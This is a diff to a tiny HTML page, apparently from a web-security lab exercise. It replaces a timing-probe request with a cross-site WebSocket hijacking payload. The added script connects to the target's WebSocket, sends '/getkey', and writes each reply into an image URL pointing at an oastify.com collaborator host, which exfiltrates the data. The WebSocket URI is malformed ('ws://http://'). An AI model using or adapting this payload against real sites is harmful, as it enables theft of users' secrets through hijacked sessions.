@@ -1,15 +1,14 @@
 <html>
 <body>
 <script>
+var uri      = "ws://http://ptl-524eda3b-76481dad.libcurl.so/";
+var ws       = new WebSocket(uri);
+ws.onmessage = function(message) {
+	var data = JSON.parse(message.data);
+	document.write('<img src="http://wqqer0crn4vz7bow0vvub8oq9hf83yrn.oastify.com/?data='+data.text+'"/>');
+}
 
-var xhr = new XMLHttpRequest();
-xhr.open('GET','http://ptl-d773bfd7-dc76233e.libcurl.so/search?search=^z');
-
-t1 = performance.now();
-xhr.send(null);
-t2 = performance.now();
-document.write(t2-t1);
-
+ws.onopen = () => ws.send(JSON.stringify({  text: "/getkey" }));
 </script>
 </body>
 </html>
